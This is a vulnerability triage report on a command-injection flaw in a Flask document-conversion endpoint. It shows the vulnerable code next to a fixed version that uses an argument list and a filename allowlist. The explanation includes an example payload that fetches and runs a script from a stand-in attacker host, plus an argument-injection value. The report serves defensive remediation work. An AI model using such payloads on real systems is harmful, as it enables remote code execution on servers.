## Verdict

CWE-78 (OS Command Injection) - **exploitable**. Confidence: high.

## Source

- **Source**: `filename = request.form["filename"]` (line 14) - a Flask form field taken directly from the POST body, fully attacker-controlled with no validation or sanitization applied anywhere before it is used.
- **Sink**: `subprocess.run(command, shell=True, check=True)` (line 23).
- **Flow**: `filename` is interpolated unmodified into `input_path` (line 15) and `output_path` (line 16), then both are interpolated into the `command` string (lines 18-21) that is executed with `shell=True`. Nothing between the source and the sink constrains, escapes, or rejects the value. A filename such as `report.docx; curl http://attacker/x.sh|sh` reaches the shell verbatim and executes as a second command after the intended `libreoffice` invocation. This is a real, unmitigated path, not a false positive.
- **Sink contract** (established before writing the fix): `subprocess.run` returns a `CompletedProcess`, whose return value the current code discards; `check=True` means a non-zero LibreOffice exit raises `CalledProcessError`, which propagates uncaught (there is no surrounding `try/except`) and Flask turns it into a 500 response - this failure behavior is preserved by the fix. `stdout`/`stderr` are not captured, so LibreOffice's console output is inherited by the parent process's file descriptors in both the original and fixed code. `cwd`, `env`, and `timeout` are all left at their defaults (current working directory, inherited environment, no timeout) in the original code and remain so in the fix.

## Fix

Running LibreOffice is the purpose of this endpoint, not an incidental wrapper around something Python can do natively - there is no standard-library document-conversion API, so the correct remediation is safe parameterized execution, not eliminating the subprocess call. Per the Python guidance, that means `shell=False` with an argument list, the executable invoked by absolute path, and an allowlist on `filename` as a secondary layer that also blocks argument injection (a filename starting with `-` being read as a LibreOffice flag).

Vulnerable code:

```python
import subprocess

from flask import Flask, request, send_file

app = Flask(__name__)

UPLOAD_DIR = "/var/data/uploads"
OUTPUT_DIR = "/var/data/converted"


@app.route("/convert", methods=["POST"])
def convert_document():
    """Convert an uploaded document to PDF using the installed LibreOffice CLI."""
    filename = request.form["filename"]
    input_path = f"{UPLOAD_DIR}/{filename}"
    output_path = f"{OUTPUT_DIR}/{filename}.pdf"

    command = (
        f"libreoffice --headless --convert-to pdf "
        f"--outdir {OUTPUT_DIR} {input_path}"
    )
    # SAST FINDING: CWE-78 - untrusted filename reaches a shell-interpreted command string.
    subprocess.run(command, shell=True, check=True)

    return send_file(output_path)


if __name__ == "__main__":
    app.run()
```

Fixed code:

```python
import re
import subprocess

from flask import Flask, request, send_file

app = Flask(__name__)

UPLOAD_DIR = "/var/data/uploads"
OUTPUT_DIR = "/var/data/converted"
LIBREOFFICE_BIN = "/usr/bin/libreoffice"  # confirm this path with `which libreoffice` on the target host

# Allowlist: no path separators, no leading '-' (blocks argument injection into the
# libreoffice CLI), no leading '.' (blocks hidden/relative traversal segments).
SAFE_FILENAME_RE = re.compile(r"[A-Za-z0-9][A-Za-z0-9._-]*")


@app.route("/convert", methods=["POST"])
def convert_document():
    """Convert an uploaded document to PDF using the installed LibreOffice CLI."""
    filename = request.form["filename"]
    if not SAFE_FILENAME_RE.fullmatch(filename):
        return "invalid filename", 400

    input_path = f"{UPLOAD_DIR}/{filename}"
    output_path = f"{OUTPUT_DIR}/{filename}.pdf"

    command = [
        LIBREOFFICE_BIN,
        "--headless",
        "--convert-to",
        "pdf",
        "--outdir",
        OUTPUT_DIR,
        input_path,
    ]
    subprocess.run(command, shell=False, check=True)

    return send_file(output_path)


if __name__ == "__main__":
    app.run()
```

## Explanation

The fix closes the injection on two independent layers. First, `command` is now passed as an argument list with `shell=False`, so `filename` is delivered to `execve` as a single opaque argument - no shell ever parses it, which eliminates metacharacter injection (`;`, `|`, `&&`, backticks, etc.) regardless of what the string contains. Second, `filename` is validated with `re.fullmatch()` (anchored at both ends, unlike `re.match()` with `^...$`, which in Python would still accept a trailing newline) against an allowlist that requires the first character to be alphanumeric - this closes the remaining argument-injection gap that an argument list alone does not: an array still hands the target program a full argument, so a filename like `--convert-to=exec:evil` would otherwise be read by `libreoffice` as a flag rather than a filename. The executable is also invoked by its absolute path (`LIBREOFFICE_BIN`) rather than by bare name, so a writable `PATH` entry ahead of the real binary cannot substitute a different program.

## Behaviour changes

- **Added a 400 response for invalid filenames.** The original code had no filename validation at all and would attempt the shell command (and fail unpredictably, or worse, succeed maliciously) for any input; this is new input handling required to close the argument-injection gap, not present in the original success path for well-formed filenames.
- **`command` changed from a shell string to an argument list; `shell=True` -> `shell=False`.** This is the core fix and is the change the finding requires.
- **Executable reference changed from bare `libreoffice` to an absolute path (`LIBREOFFICE_BIN`).** Defense-in-depth per the guidance (prevents `PATH`-substitution attacks); assumed at `/usr/bin/libreoffice` since the actual install path is not visible in this file - flagged in the fixed code as needing confirmation against the target host, and low-confidence until confirmed.
- Everything else is unchanged: `check=True` is preserved (same failure behavior - `CalledProcessError` propagates uncaught on a non-zero LibreOffice exit, same as the original), `stdout`/`stderr` are still not captured, `cwd`/`env`/`timeout` are still left at their defaults, the return value of `subprocess.run` is still discarded, and `send_file(output_path)` is untouched.
